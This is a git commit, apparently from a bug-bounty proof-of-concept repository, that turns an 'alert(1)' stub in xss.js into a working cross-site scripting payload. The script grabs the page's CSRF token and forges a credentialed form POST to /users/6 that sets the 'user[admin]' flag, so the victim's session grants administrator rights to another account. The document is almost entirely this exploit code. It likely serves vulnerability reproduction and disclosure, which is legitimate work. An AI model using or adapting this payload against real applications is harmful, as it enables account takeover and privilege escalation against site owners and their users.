955898fc88b637722f976b12a5d34d6a11f2da88
YWHTRIAGE2 <pocrepro-ywh-27cb04e8a890949b@yeswehack.ninja>
2026-03-10 14:20:00 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,1 +1,43 @@
 alert(1)
+const csrf = document
+  .querySelector('meta[name="csrf-token"]')
+  ?.getAttribute("content");
+
+async function escalatePrivileges() {
+  console.log("Attempting to escalate privileges...");
+  if (!csrf) {
+    throw new Error("CSRF token not found");
+  }
+
+  const body = new URLSearchParams({
+    _method: "put",
+    authenticity_token: csrf,
+    "user[login]": "test@test.com",
+    "user[firstname]": "test",
+    "user[lastname]": "test",
+    "user[mail]": "test@test.com",
+    "user[language]": "en",
+    "user[admin]": "1",
+    "user[password]": "",
+    "user[password_confirmation]": "",
+    send_information: "1",
+    "user[force_password_change]": "0",
+    "pref[time_zone]": "Etc/UTC",
+    "pref[theme]": "light",
+    "pref[disable_keyboard_shortcuts]": "0",
+    button: "",
+  });
+
+  // Replace target user id with attacker id, the id was 5 in my case
+  await fetch(`/users/6`, {
+    method: "POST",
+    credentials: "include", // send session cookie
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    },
+    body: body.toString(),
+  });
+}
+
+escalatePrivileges();
